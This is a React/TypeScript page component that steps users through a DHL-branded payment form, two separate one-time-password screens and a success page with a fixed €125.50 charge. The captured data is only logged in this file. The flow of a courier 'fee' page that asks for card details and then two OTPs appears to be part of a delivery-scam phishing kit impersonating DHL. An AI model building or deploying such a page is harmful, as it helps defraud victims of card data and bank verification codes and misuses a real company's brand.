import { useState } from "react";
import DHLPaymentForm, { type PaymentFormData } from "@/components/DHLPaymentForm";
import OTPVerification from "@/components/OTPVerification";
import PaymentSuccess from "@/components/PaymentSuccess";

type PaymentStep = "payment" | "otp1" | "otp2" | "success";

export default function HomePage() {
  const [step, setStep] = useState<PaymentStep>("payment");
  const [paymentData, setPaymentData] = useState<PaymentFormData | null>(null);

  const handlePaymentSubmit = (data: PaymentFormData) => {
    console.log("Payment data submitted:", data);
    setPaymentData(data);
    setStep("otp1");
  };

  const handleOtp1Submit = (otp: string) => {
    console.log("OTP 1 submitted:", otp);
    setStep("otp2");
  };

  const handleOtp2Submit = (otp: string) => {
    console.log("OTP 2 submitted:", otp);
    setStep("success");
  };

  const handleReturnHome = () => {
    setStep("payment");
    setPaymentData(null);
  };

  return (
    <>
      {step === "payment" && <DHLPaymentForm onSubmit={handlePaymentSubmit} />}
      {step === "otp1" && (
        <OTPVerification
          step={1}
          onSubmit={handleOtp1Submit}
          onResend={() => console.log("Resend OTP 1")}
        />
      )}
      {step === "otp2" && (
        <OTPVerification
          step={2}
          onSubmit={handleOtp2Submit}
          onResend={() => console.log("Resend OTP 2")}
        />
      )}
      {step === "success" && (
        <PaymentSuccess
          onReturnHome={handleReturnHome}
          paymentDetails={{
            amount: "€125.50",
            transactionId: `TXN-${Date.now()}`,
            date: new Date().toLocaleDateString("fr-FR"),
          }}
        />
      )}
    </>
  );
}
